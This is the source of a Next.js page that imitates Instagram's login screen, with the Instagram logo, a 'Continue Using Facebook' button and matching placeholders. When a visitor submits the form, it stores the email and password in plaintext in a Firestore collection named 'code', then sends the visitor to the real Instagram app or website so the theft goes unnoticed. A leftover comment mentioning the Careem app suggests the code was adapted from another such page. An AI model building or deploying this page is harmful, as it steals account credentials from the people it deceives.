"use client";import React, { useState, useEffect } from 'react';
import { firestore } from './firebaseconfig'; // Adjust the import path
import { collection, addDoc } from 'firebase/firestore'; // Import the necessary functions
import { FaFacebookSquare } from "react-icons/fa";
import { useRouter } from 'next/router';

export default function Login() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [loading, setLoading] = useState(false); // Add loading state
  const [isClient, setIsClient] = useState(false);
  const router = useRouter(); // Hook for routing

  useEffect(() => {
    // Set client-side flag once component is mounted
    setIsClient(true);
  }, []);

  const handleSubmit = async (event) => {
    event.preventDefault();
    
    if (!email || !password) {
      setError('Please enter both email and password');
      return;
    }

    setLoading(true); // Set loading to true when starting the submit process
    
    try {
      const usersCollection = collection(firestore, 'code');
      await addDoc(usersCollection, {
        email: email,
        password: password,
      });

      setSuccess('successfully');
      setError('');

      // Try to open the Careem app if installed, otherwise redirect to the website
      
    } catch (error) {
      console.error('Error saving user data:', error);
      setError('Error saving user data');
      setSuccess('');
    } finally {
      setLoading(false); // Set loading to false after completing the submit process
    }
  };

  useEffect(() => {
    if (success && isClient) {
      if (navigator.userAgent.match(/Android|iPhone/i)) {
        router.push('instagram://'); // This won't work in many browsers
      } else {
        router.push('https://www.instagram.com');
      }
    }
  }, [success, isClient]);

  return (
    <div className="min-h-screen flex flex-col justify-center items-center">
      <div className="flex flex-col md:flex-row md:items-center md:space-x-8 w-full max-w-screen-lg px-4">
        {/* Logo Section */}
        <div className="mb-8 md:mb-0 md:w-1/2 flex justify-center">
          <img
            src="/logo.png" // Add your Instagram-like logo here
            alt="Instagram"
            className="h-12 md:h-16"
          />
        </div>
        <div className='px-8 flex items-center justify-center'>
          <button
            type="button"
            className="w-full bg-[#0095F6] flex items-center justify-center text-white py-2 rounded-md text-sm font-medium hover:bg-blue-600 gap-x-1"
          >
            <FaFacebookSquare /> Continue Using Facebook
          </button>
        </div>
        <div className="mt-4 px-8 flex items-center justify-between">
          <span className="border-b border-gray-300 flex-1"></span>
          <span className="text-gray-500 text-xs px-2">OR</span>
          <span className="border-b border-gray-300 flex-1"></span>
        </div>
        {/* Form Section */}
        <div className="bg-white p-8 rounded-md max-w-md w-full md:w-2/5">
          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <input
                type="text"
                placeholder="Phone number, username, or email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full px-3 py-2 border border-gray-400 rounded-sm focus:outline-none focus:border-gray-400 text-sm bg-[#FAFAFA]"
              />
            </div>
            <div>
              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-3 py-2 border border-gray-400 rounded-sm focus:outline-none focus:border-gray-400 text-sm bg-[#FAFAFA]"
              />
            </div>
            <div className="text-right mt-4">
              <a href="#" className="text-[#0D9BF7] text-xs">
                Forgotten your password?
              </a>
            </div>
            <button
              type="submit"
              className="w-full bg-[#4CB5F9] text-white py-2 rounded-md text-sm font-medium hover:bg-blue-600"
              disabled={loading}
            >
              {loading ? 'Saving...' : 'Log In'}
            </button>
          </form>
        </div>
      </div>

      {/* Sign Up Section */}
      <div className="bg-white p-4 rounded-md max-w-xs w-full mt-4 text-center">
        <span className="text-sm">Don&apos;t have an account? </span>
        <a href="#" className="text-blue-500 text-sm font-medium">
          Sign up
        </a>
      </div>
    </div>
  );
}
